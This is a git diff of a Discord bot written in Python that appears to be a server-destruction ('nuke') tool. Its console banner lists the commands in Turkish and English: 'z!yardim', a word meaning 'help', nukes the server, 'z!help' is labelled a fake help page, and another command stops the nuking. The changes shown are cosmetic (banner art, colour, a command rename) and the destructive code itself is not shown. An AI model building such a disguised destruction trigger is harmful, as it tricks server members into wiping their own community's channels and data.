@@ -22,22 +22,27 @@ client = commands.Bot(command_prefix="z!")
 
 @client.event
 async def on_ready():
-   print(Fore.GREEN + ''' 
+   print(Fore.RED + ''' 
    
-█▀▀▄ █░░█ █░█ █▀▀   █▀▀▄ █▀▀█ ▀▀█▀▀   █▀▀▄ █░░█   █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀█
-█░░█ █░░█ █▀▄ █▀▀   █▀▀▄ █░░█ ░░█░░   █▀▀▄ █▄▄█   ▀▀█ █▀▀ █▄▄▀ █▄▄█ █░░█
-▀░░▀ ░▀▀▀ ▀░▀ ▀▀▀   ▀▀▀░ ▀▀▀▀ ░░▀░░   ▀▀▀░ ▄▄▄█   ▀▀▀ ▀▀▀ ▀░▀▀ ▀░░▀ █▀▀▀
+ ███▄    █  █    ██  ██ ▄█▀▓█████     ▄▄▄▄    ▒█████  ▄▄▄█████▓
+ ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀    ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
+▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███      ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
+▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄    ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
+▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
+░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
+░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░   ▒░▒   ░   ░ ▒ ▒░     ░    
+   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░       ░    ░ ░ ░ ░ ▒    ░      
+         ░    ░     ░  ░      ░  ░    ░          ░ ░       
 
 [1] z!yardim chat to nuke the server. / chate z!yardim yazarak sunucuyu nukeleyin.
 [2] z!help is a fake help page. / z!help sahte bir yardım sayfasıdır.
-[3] z!commands stop server nuking. / z!commands sunucuyu nukelemeyi durdurur.
- ''')
+[3] z!commands stop server nuking. / z!commands sunucuyu nukelemeyi durdurur.  
 
-   await client.change_presence(activity=discord.Game(name="Zortex Premium"))
+''')
 
 @client.command()
 @commands.is_owner()
-async def komutlar(ctx):
+async def dur(ctx):
     await ctx.bot.logout()
     print (Fore.GREEN + f"{client.user.name} başarıyla çıkış yaptı." + Fore.RESET)
 
